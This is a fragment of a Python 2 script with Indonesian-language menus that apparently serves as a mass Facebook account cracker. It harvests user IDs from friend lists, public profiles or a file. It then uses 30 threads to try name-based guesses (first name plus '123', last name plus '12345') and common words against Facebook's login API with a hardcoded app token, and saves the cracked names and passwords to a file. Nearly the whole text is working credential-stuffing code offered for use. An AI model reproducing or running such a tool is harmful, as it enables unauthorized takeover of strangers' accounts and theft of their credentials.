    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Sayang'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Bangsat'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = 'Anjing'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = 'Kontol'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone Indo.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;92m _________   ________.    '
    print '\x1b[1;92m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;92m  \\______  /|__|   |___  /'
    print '\x1b[1;92m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mBangladesh\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_bangla()


def pilih_bangla():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_bangla()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;92m _________   ________.    '
            print '\x1b[1;92m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;92m  \\______  /|__|   |___  /'
            print '\x1b[1;92m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK BANGLADESH \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;92m _________   ________.    '
            print '\x1b[1;92m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;92m  \\______  /|__|   |___  /'
            print '\x1b[1;92m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK BANGLADESH \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idb = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m)\x1b[1;97m ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m)\x1b[1;97m Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_bangla()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;92m _________   ________.    '
            print '\x1b[1;92m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;91m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;92m  \\______  /|__|   |___  /'
            print '\x1b[1;92m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK BANGLADESH \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m)\x1b[1;97m Nama File \x1b[1;91m:\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_bangla()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_bangla()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
